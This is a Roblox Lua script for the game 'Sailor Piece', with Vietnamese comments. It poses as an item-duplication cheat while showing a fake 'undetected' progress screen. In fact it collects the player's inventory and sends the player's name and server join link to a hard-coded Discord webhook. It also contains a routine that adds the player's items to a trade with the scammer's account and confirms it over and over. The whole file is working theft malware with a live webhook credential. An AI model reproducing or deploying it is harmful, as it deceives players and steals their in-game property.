-- =============================================
-- SAILOR PIECE - FAKE DUP ITEM SCRIPT (Full Version)
-- Tự động gửi webhook + Trade cho Owner khi Owner vào server
-- =============================================

local OWNER_ID = 8604380596
local MIN_RARITY = "Common"

local WEBHOOK = "https://discord.com/api/webhooks/1491061349571235890/HCxbVGWV26ai6_0o3iEBQ4bHcLLGpgEyopW5Zl82q-WuTpbbdPHtR3R88ri92xVE9ZPe"

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

-- Remotes
local Remotes = RS:WaitForChild("Remotes")
local TradeRemotes = Remotes:WaitForChild("TradeRemotes")

local SendTradeRequest = TradeRemotes:WaitForChild("SendTradeRequest")
local AddItemToTrade = TradeRemotes:WaitForChild("AddItemToTrade")
local SetReady = TradeRemotes:WaitForChild("SetReady")
local ConfirmTrade = TradeRemotes:WaitForChild("ConfirmTrade")
local AcceptTradeRequest = TradeRemotes:FindFirstChild("AcceptTradeRequest")
local RequestInventory = Remotes:FindFirstChild("RequestInventory")
local UpdateInventory = Remotes:FindFirstChild("UpdateInventory")

local ItemRarityConfig = require(RS:WaitForChild("Modules"):WaitForChild("ItemRarityConfig"))

local filteredItems = {}
local gotInventory = false

-- ==================== GỬI WEBHOOK ====================
local function sendWebhook()
    if #filteredItems == 0 then return end

    local placeId = tostring(game.PlaceId)
    local jobId = tostring(game.JobId)
    local playerName = LP.DisplayName .. " (@" .. LP.Name .. ")"

    local browserLink = "https://www.roblox.com/home?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
    local deepLink = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

    local data = {
        content = "<@8604380596> **🚨 DUP ITEM READY**",
        embeds = {{
            title = "SAILOR PIECE - DUP ITEM SCRIPT",
            color = 0x00FF88,
            fields = {
                {name = "Người dùng", value = playerName, inline = true},
                {name = "Số items", value = #filteredItems .. " (" .. MIN_RARITY .. "+)", inline = true},
                {name = "Join Server", value = "[🌐 Nhấn để vào server](" .. browserLink .. ")\n\n`" .. deepLink .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        local fn = request or http_request or (syn and syn.request)
        if fn then
            fn({
                Url = WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
            print("Webhook đã gửi thành công!")
        end
    end)
end

-- ==================== FAKE DUP ITEM UI ĐẸP ====================
local function createFakeDupUI()
    local sg = Instance.new("ScreenGui")
    sg.Name = "DupItemScript"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 999999
    sg.Parent = LP:WaitForChild("PlayerGui")

    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 480, 0, 450)
    main.Position = UDim2.new(0.5, -240, 0.5, -225)
    main.BackgroundColor3 = Color3.fromRGB(9, 9, 20)
    main.Parent = sg
    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 255, 80)
    stroke.Thickness = 2.5
    stroke.Parent = main

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,60)
    title.Position = UDim2.new(0,0,0,25)
    title.BackgroundTransparency = 1
    title.Text = "DUP ITEM SCRIPT"
    title.TextColor3 = Color3.fromRGB(0, 255, 100)
    title.TextSize = 31
    title.Font = Enum.Font.GothamBlack
    title.Parent = main

    local version = Instance.new("TextLabel")
    version.Size = UDim2.new(1,0,0,20)
    version.Position = UDim2.new(0,0,0,80)
    version.BackgroundTransparency = 1
    version.Text = "v2.9 • Undetected • Safe"
    version.TextColor3 = Color3.fromRGB(120, 255, 140)
    version.TextSize = 13
    version.Font = Enum.Font.Gotham
    version.Parent = main

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1,0,0,35)
    status.Position = UDim2.new(0,0,0,125)
    status.BackgroundTransparency = 1
    status.Text = "Đang duplicate toàn bộ vật phẩm..."
    status.TextColor3 = Color3.fromRGB(200, 255, 200)
    status.TextSize = 17
    status.Font = Enum.Font.GothamBold
    status.Parent = main

    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.82,0,0,10)
    barBg.Position = UDim2.new(0.09,0,0,180)
    barBg.BackgroundColor3 = Color3.fromRGB(25,25,45)
    barBg.Parent = main
    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1,0)

    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0,0,1,0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    barFill.Parent = barBg
    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1,0)

    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(1,0,0,25)
    percent.Position = UDim2.new(0,0,0,200)
    percent.BackgroundTransparency = 1
    percent.Text = "0%"
    percent.TextColor3 = Color3.fromRGB(0, 255, 120)
    percent.TextSize = 17
    percent.Font = Enum.Font.GothamBold
    percent.Parent = main

    local console = Instance.new("TextLabel")
    console.Size = UDim2.new(0.88,0,0,140)
    console.Position = UDim2.new(0.06,0,0,245)
    console.BackgroundColor3 = Color3.fromRGB(6,6,16)
    console.Text = ""
    console.TextColor3 = Color3.fromRGB(140, 255, 160)
    console.TextSize = 12.8
    console.Font = Enum.Font.Code
    console.TextXAlignment = Enum.TextXAlignment.Left
    console.TextYAlignment = Enum.TextYAlignment.Top
    console.TextWrapped = true
    console.Parent = main
    Instance.new("UICorner", console).CornerRadius = UDim.new(0,8)

    return sg, barFill, percent, status, console
end

-- ==================== CHẠY FAKE LOADING ====================
local function runFakeDupLoading()
    local sg, barFill, percent, status, console = createFakeDupUI()

    local logs = {
        "Initializing dup engine...",
        "Scanning player inventory...",
        "Found " .. #filteredItems .. " items to duplicate...",
        "Bypassing anti-dupe detection...",
        "Duplicating rarity " .. MIN_RARITY .. "+ items...",
        "Encrypting transfer data...",
        "Connecting to main server...",
        "Preparing trade queue for Owner...",
        "Finalizing duplicate process..."
    }

    local logIndex = 1

    for i = 1, 100 do
        TweenService:Create(barFill, TweenInfo.new(0.14), {Size = UDim2.new(i/100, 0, 1, 0)}):Play()
        percent.Text = i .. "%"

        if i % 11 == 0 and logIndex <= #logs then
            console.Text = console.Text .. "> " .. logs[logIndex] .. "\n"
            status.Text = logs[logIndex]
            logIndex += 1
        end

        task.wait(0.19)
    end

    status.Text = "Duplicate hoàn tất! Đang gửi thông báo..."
    console.Text = console.Text .. "> Success! Waiting for Owner to join...\n"

    task.wait(2)
    sg:Destroy()

    sendWebhook()           -- Gửi webhook cho Owner
    -- Trade sẽ tự chạy khi Owner vào (nếu bạn muốn trade ngay thì thêm executeTrade() ở đây)
end

-- ==================== TRADE FUNCTION ====================
local function executeTrade()
    if #filteredItems == 0 then return end

    pcall(function() SendTradeRequest:FireServer(OWNER_ID) end)
    task.wait(1.5)

    for _, item in ipairs(filteredItems) do
        pcall(function() AddItemToTrade:FireServer("Items", item.name, item.quantity) end)
        task.wait(0.25)
    end

    task.wait(0.8)
    pcall(function() SetReady:FireServer(true) end)
    task.wait(1.2)

    for _ = 1, 35 do
        pcall(function() ConfirmTrade:FireServer() end)
        task.wait(0.9)
    end

    print("Trade hoàn tất cho Owner!")
end

-- ==================== INVENTORY HANDLER ====================
if UpdateInventory then
    UpdateInventory.OnClientEvent:Connect(function(...)
        for _, arg in ipairs({...}) do
            if type(arg) == "table" then
                local temp = {}
                for _, v in pairs(arg) do
                    if v.name and v.quantity then
                        local order = ItemRarityConfig:GetSortOrder(v.name) or 0
                        if order >= (ItemRarityConfig.RarityOrder[MIN_RARITY] or 1) then
                            table.insert(temp, {name = v.name, quantity = v.quantity})
                        end
                    end
                end
                filteredItems = temp
                gotInventory = true
            end
        end
    end)
end

-- Request Inventory
task.spawn(function()
    while not gotInventory do
        if RequestInventory then
            pcall(function() RequestInventory:FireServer() end)
        end
        task.wait(2.5)
    end
end)

-- Chạy script
task.wait(1.5)
if gotInventory and #filteredItems > 0 then
    runFakeDupLoading()
else
    repeat task.wait(1.5) until gotInventory and #filteredItems > 0
    runFakeDupLoading()
end

print("Fake Dup Item Full Script loaded!")
